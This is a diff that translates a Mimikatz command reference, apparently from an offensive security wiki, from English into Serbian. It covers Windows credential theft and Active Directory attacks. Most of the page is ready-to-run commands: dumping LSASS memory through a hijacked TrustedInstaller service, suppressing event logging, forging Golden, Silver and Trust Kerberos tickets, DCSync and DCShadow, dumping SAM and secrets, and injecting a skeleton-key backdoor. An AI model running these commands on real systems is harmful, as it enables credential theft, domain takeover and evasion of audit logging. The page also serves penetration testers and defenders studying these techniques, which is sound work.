@@ -4,220 +4,209 @@
 
 <figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+Produbite svoje znanje o **Mobilnoj Bezbednosti** sa 8kSec Akademijom. Savladajte sigurnost iOS i Android-a kroz naše kurseve koji se mogu pratiti sopstvenim tempom i dobijite sertifikat:
 
 {% embed url="https://academy.8ksec.io/" %}
 
-**This page is based on one from [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Check the original for further info!
+**Ova stranica se zasniva na jednoj sa [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Proverite original za dodatne informacije!
 
-## LM and Clear-Text in memory
+## LM i Plain-Text u memoriji
 
-From Windows 8.1 and Windows Server 2012 R2 onwards, significant measures have been implemented to safeguard against credential theft:
+Od Windows 8.1 i Windows Server 2012 R2 nadalje, implementirane su značajne mere za zaštitu od krađe kredencijala:
 
-- **LM hashes and plain-text passwords** are no longer stored in memory to enhance security. A specific registry setting, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ must be configured with a DWORD value of `0` to disable Digest Authentication, ensuring "clear-text" passwords are not cached in LSASS.
+- **LM hash i plain-text lozinke** više se ne čuvaju u memoriji radi poboljšanja sigurnosti. Specifična registracija, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ mora biti konfigurisana sa DWORD vrednošću `0` da bi se onemogućila Digest Authentication, osiguravajući da "plain-text" lozinke nisu keširane u LSASS.
 
-- **LSA Protection** is introduced to shield the Local Security Authority (LSA) process from unauthorized memory reading and code injection. This is achieved by marking the LSASS as a protected process. Activation of LSA Protection involves:
-  1. Modifying the registry at _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ by setting `RunAsPPL` to `dword:00000001`.
-  2. Implementing a Group Policy Object (GPO) that enforces this registry change across managed devices.
+- **LSA Zaštita** je uvedena da zaštiti proces Lokalnog Bezbednosnog Autoriteta (LSA) od neovlašćenog čitanja memorije i injekcije koda. To se postiže označavanjem LSASS-a kao zaštićenog procesa. Aktivacija LSA Zaštite uključuje:
+1. Modifikaciju registra na _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ postavljanjem `RunAsPPL` na `dword:00000001`.
+2. Implementaciju Grupske Politike (GPO) koja sprovodi ovu promenu registra na upravljanim uređajima.
 
-Despite these protections, tools like Mimikatz can circumvent LSA Protection using specific drivers, although such actions are likely to be recorded in event logs.
+Uprkos ovim zaštitama, alati poput Mimikatz mogu zaobići LSA Zaštitu koristeći specifične drajvere, iako su takve akcije verovatno zabeležene u dnevnicima događaja.
 
-### Counteracting SeDebugPrivilege Removal
+### Suprotstavljanje uklanjanju SeDebugPrivilege
 
-Administrators typically have SeDebugPrivilege, enabling them to debug programs. This privilege can be restricted to prevent unauthorized memory dumps, a common technique used by attackers to extract credentials from memory. However, even with this privilege removed, the TrustedInstaller account can still perform memory dumps using a customized service configuration:
-
+Administratori obično imaju SeDebugPrivilege, što im omogućava da debaguju programe. Ova privilegija može biti ograničena da se spreče neovlašćeni dump-ovi memorije, što je uobičajena tehnika koju napadači koriste za vađenje kredencijala iz memorije. Međutim, čak i sa ovom privilegijom uklonjenom, TrustedInstaller nalog može i dalje vršiti dump-ove memorije koristeći prilagođenu konfiguraciju servisa:
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-
-This allows the dumping of the `lsass.exe` memory to a file, which can then be analyzed on another system to extract credentials:
-
+Ovo omogućava iskopavanje memorije `lsass.exe` u datoteku, koja se zatim može analizirati na drugom sistemu kako bi se izvukle kredencijali:
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
 # sekurlsa::logonpasswords
 ```
+## Mimikatz Opcije
 
-## Mimikatz Options
+Manipulacija dnevnikom događaja u Mimikatz-u uključuje dve glavne radnje: brisanje dnevnika događaja i patch-ovanje Event servisa kako bi se sprečilo beleženje novih događaja. Ispod su komande za izvođenje ovih radnji:
 
-Event log tampering in Mimikatz involves two primary actions: clearing event logs and patching the Event service to prevent logging of new events. Below are the commands for performing these actions:
+#### Brisanje Dnevnika Događaja
 
-#### Clearing Event Logs
+- **Komanda**: Ova radnja je usmerena na brisanje dnevnika događaja, čineći teže praćenje zlonamernih aktivnosti.
+- Mimikatz ne pruža direktnu komandu u svojoj standardnoj dokumentaciji za brisanje dnevnika događaja direktno putem komandne linije. Međutim, manipulacija dnevnikom događaja obično uključuje korišćenje sistemskih alata ili skripti van Mimikatz-a za brisanje specifičnih dnevnika (npr. korišćenjem PowerShell-a ili Windows Event Viewer-a).
 
-- **Command**: This action is aimed at deleting the event logs, making it harder to track malicious activities.
-- Mimikatz does not provide a direct command in its standard documentation for clearing event logs directly via its command line. However, event log manipulation typically involves using system tools or scripts outside of Mimikatz to clear specific logs (e.g., using PowerShell or Windows Event Viewer).
+#### Eksperimentalna Funkcija: Patch-ovanje Event Servisa
 
-#### Experimental Feature: Patching the Event Service
+- **Komanda**: `event::drop`
+- Ova eksperimentalna komanda je dizajnirana da modifikuje ponašanje Event Logging Servisa, efikasno sprečavajući ga da beleži nove događaje.
+- Primer: `mimikatz "privilege::debug" "event::drop" exit`
 
-- **Command**: `event::drop`
-- This experimental command is designed to modify the Event Logging Service's behavior, effectively preventing it from recording new events.
-- Example: `mimikatz "privilege::debug" "event::drop" exit`
+- Komanda `privilege::debug` osigurava da Mimikatz radi sa potrebnim privilegijama za modifikaciju sistemskih servisa.
+- Komanda `event::drop` zatim patch-uje Event Logging servis.
 
-- The `privilege::debug` command ensures that Mimikatz operates with the necessary privileges to modify system services.
-- The `event::drop` command then patches the Event Logging service.
+### Kerberos Napadi na Tikete
 
-### Kerberos Ticket Attacks
+### Kreiranje Zlatnog Tiketa
 
-### Golden Ticket Creation
+Zlatni tiket omogućava pristup domeni pod lažnim identitetom. Ključna komanda i parametri:
 
-A Golden Ticket allows for domain-wide access impersonation. Key command and parameters:
+- Komanda: `kerberos::golden`
+- Parametri:
+- `/domain`: Ime domena.
+- `/sid`: Sigurnosni identifikator (SID) domena.
+- `/user`: Korisničko ime koje se impersonira.
+- `/krbtgt`: NTLM hash KDC servisnog naloga domena.
+- `/ptt`: Direktno injektuje tiket u memoriju.
+- `/ticket`: Čuva tiket za kasniju upotrebu.
 
-- Command: `kerberos::golden`
-- Parameters:
-  - `/domain`: The domain name.
-  - `/sid`: The domain's Security Identifier (SID).
-  - `/user`: The username to impersonate.
-  - `/krbtgt`: The NTLM hash of the domain's KDC service account.
-  - `/ptt`: Directly injects the ticket into memory.
-  - `/ticket`: Saves the ticket for later use.
-
-Example:
-
+Primer:
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
+### Kreiranje Silver Tiket-a
 
-### Silver Ticket Creation
+Silver Tiketi omogućavaju pristup specifičnim uslugama. Ključna komanda i parametri:
 
-Silver Tickets grant access to specific services. Key command and parameters:
+- Komanda: Slična Golden Ticket-u, ali cilja specifične usluge.
+- Parametri:
+- `/service`: Usluga koju treba ciljati (npr., cifs, http).
+- Ostali parametri slični Golden Ticket-u.
 
-- Command: Similar to Golden Ticket but targets specific services.
-- Parameters:
-  - `/service`: The service to target (e.g., cifs, http).
-  - Other parameters similar to Golden Ticket.
-
-Example:
-
+Primer:
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
+### Kreiranje Trust Tiket-a
 
-### Trust Ticket Creation
+Trust Tiketi se koriste za pristup resursima širom domena koristeći odnose poverenja. Ključna komanda i parametri:
 
-Trust Tickets are used for accessing resources across domains by leveraging trust relationships. Key command and parameters:
+- Komanda: Slično Golden Ticket-u, ali za odnose poverenja.
+- Parametri:
+- `/target`: FQDN ciljnog domena.
+- `/rc4`: NTLM hash za račun poverenja.
 
-- Command: Similar to Golden Ticket but for trust relationships.
-- Parameters:
-  - `/target`: The target domain's FQDN.
-  - `/rc4`: The NTLM hash for the trust account.
-
-Example:
-
+Primer:
 ```bash
 mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
 ```
-
-### Additional Kerberos Commands
+### Dodatne Kerberos Komande
 
 - **Listing Tickets**:
 
-  - Command: `kerberos::list`
-  - Lists all Kerberos tickets for the current user session.
+- Komanda: `kerberos::list`
+- Prikazuje sve Kerberos karte za trenutnu korisničku sesiju.
 
 - **Pass the Cache**:
 
-  - Command: `kerberos::ptc`
-  - Injects Kerberos tickets from cache files.
-  - Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
+- Komanda: `kerberos::ptc`
+- Umeće Kerberos karte iz keš fajlova.
+- Primer: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
 - **Pass the Ticket**:
 
-  - Command: `kerberos::ptt`
-  - Allows using a Kerberos ticket in another session.
-  - Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
+- Komanda: `kerberos::ptt`
+- Omogućava korišćenje Kerberos karte u drugoj sesiji.
+- Primer: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
 - **Purge Tickets**:
-  - Command: `kerberos::purge`
-  - Clears all Kerberos tickets from the session.
-  - Useful before using ticket manipulation commands to avoid conflicts.
+- Komanda: `kerberos::purge`
+- Briše sve Kerberos karte iz sesije.
+- Korisno pre korišćenja komandi za manipulaciju kartama kako bi se izbegli konflikti.
 
-### Active Directory Tampering
+### Aktivno Direktorijum Manipulacija
 
-- **DCShadow**: Temporarily make a machine act as a DC for AD object manipulation.
+- **DCShadow**: Privremeno čini mašinu da se ponaša kao DC za manipulaciju AD objektima.
 
-  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
+- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
-- **DCSync**: Mimic a DC to request password data.
-  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
+- **DCSync**: Oponaša DC da zatraži podatke o lozinkama.
+- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
-### Credential Access
+### Pristup Akreditivima
 
-- **LSADUMP::LSA**: Extract credentials from LSA.
+- **LSADUMP::LSA**: Ekstrahuje akreditive iz LSA.
 
-  - `mimikatz "lsadump::lsa /inject" exit`
+- `mimikatz "lsadump::lsa /inject" exit`
 
-- **LSADUMP::NetSync**: Impersonate a DC using a computer account's password data.
+- **LSADUMP::NetSync**: Oponaša DC koristeći podatke o lozinkama računa računara.
 
-  - _No specific command provided for NetSync in original context._
+- _Nema specifične komande za NetSync u originalnom kontekstu._
 
-- **LSADUMP::SAM**: Access local SAM database.
+- **LSADUMP::SAM**: Pristup lokalnoj SAM bazi podataka.
 
-  - `mimikatz "lsadump::sam" exit`
+- `mimikatz "lsadump::sam" exit`
 
-- **LSADUMP::Secrets**: Decrypt secrets stored in the registry.
+- **LSADUMP::Secrets**: Dešifruje tajne smeštene u registru.
 
-  - `mimikatz "lsadump::secrets" exit`
+- `mimikatz "lsadump::secrets" exit`
 
-- **LSADUMP::SetNTLM**: Set a new NTLM hash for a user.
+- **LSADUMP::SetNTLM**: Postavlja novu NTLM heš za korisnika.
 
-  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
+- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-- **LSADUMP::Trust**: Retrieve trust authentication information.
-  - `mimikatz "lsadump::trust" exit`
+- **LSADUMP::Trust**: Preuzima informacije o poverenju.
+- `mimikatz "lsadump::trust" exit`
 
-### Miscellaneous
+### Razno
 
-- **MISC::Skeleton**: Inject a backdoor into LSASS on a DC.
-  - `mimikatz "privilege::debug" "misc::skeleton" exit`
+- **MISC::Skeleton**: Umeće backdoor u LSASS na DC.
+- `mimikatz "privilege::debug" "misc::skeleton" exit`
 
-### Privilege Escalation
+### Eskalacija Privilegija
 
-- **PRIVILEGE::Backup**: Acquire backup rights.
+- **PRIVILEGE::Backup**: Stiče prava za pravljenje rezervnih kopija.
 
-  - `mimikatz "privilege::backup" exit`
+- `mimikatz "privilege::backup" exit`
 
-- **PRIVILEGE::Debug**: Obtain debug privileges.
-  - `mimikatz "privilege::debug" exit`
+- **PRIVILEGE::Debug**: Dobija privilegije za debagovanje.
+- `mimikatz "privilege::debug" exit`
 
-### Credential Dumping
+### Dumpovanje Akreditiva
 
-- **SEKURLSA::LogonPasswords**: Show credentials for logged-on users.
+- **SEKURLSA::LogonPasswords**: Prikazuje akreditive za prijavljene korisnike.
 
-  - `mimikatz "sekurlsa::logonpasswords" exit`
+- `mimikatz "sekurlsa::logonpasswords" exit`
 
-- **SEKURLSA::Tickets**: Extract Kerberos tickets from memory.
-  - `mimikatz "sekurlsa::tickets /export" exit`
+- **SEKURLSA::Tickets**: Ekstrahuje Kerberos karte iz memorije.
+- `mimikatz "sekurlsa::tickets /export" exit`
 
-### Sid and Token Manipulation
+### Manipulacija Sid i Token
 
-- **SID::add/modify**: Change SID and SIDHistory.
+- **SID::add/modify**: Menja SID i SIDHistory.
 
-  - Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-  - Modify: _No specific command for modify in original context._
+- Dodaj: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
+- Izmeni: _Nema specifične komande za izmenu u originalnom kontekstu._
 
-- **TOKEN::Elevate**: Impersonate tokens.
-  - `mimikatz "token::elevate /domainadmin" exit`
+- **TOKEN::Elevate**: Oponaša tokene.
+- `mimikatz "token::elevate /domainadmin" exit`
 
-### Terminal Services
+### Terminalne Usluge
 
-- **TS::MultiRDP**: Allow multiple RDP sessions.
+- **TS::MultiRDP**: Omogućava više RDP sesija.
 
-  - `mimikatz "ts::multirdp" exit`
+- `mimikatz "ts::multirdp" exit`
 
-- **TS::Sessions**: List TS/RDP sessions.
-  - _No specific command provided for TS::Sessions in original context._
+- **TS::Sessions**: Prikazuje TS/RDP sesije.
+- _Nema specifične komande za TS::Sessions u originalnom kontekstu._
 
 ### Vault
 
-- Extract passwords from Windows Vault.
-  - `mimikatz "vault::cred /patch" exit`
+- Ekstrahuje lozinke iz Windows Vault.
+- `mimikatz "vault::cred /patch" exit`
 
 <figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+Produbite svoje znanje u **Mobilnoj Bezbednosti** sa 8kSec Akademijom. Savladajte iOS i Android bezbednost kroz naše kurseve samostalnog učenja i dobijte sertifikat:
 
 {% embed url="https://academy.8ksec.io/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
